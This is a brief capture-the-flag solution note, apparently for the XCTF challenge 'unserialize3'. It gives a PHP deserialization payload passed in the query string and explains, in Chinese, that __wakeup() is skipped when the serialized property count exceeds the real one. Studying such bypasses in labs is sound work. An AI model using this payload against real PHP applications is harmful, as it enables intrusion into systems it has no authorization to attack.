# unserialize3

> payload: ?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

绕过__wakeup()原理：  

当对象属性的个数大于真实对象的个数时，__wakeup()不会执行。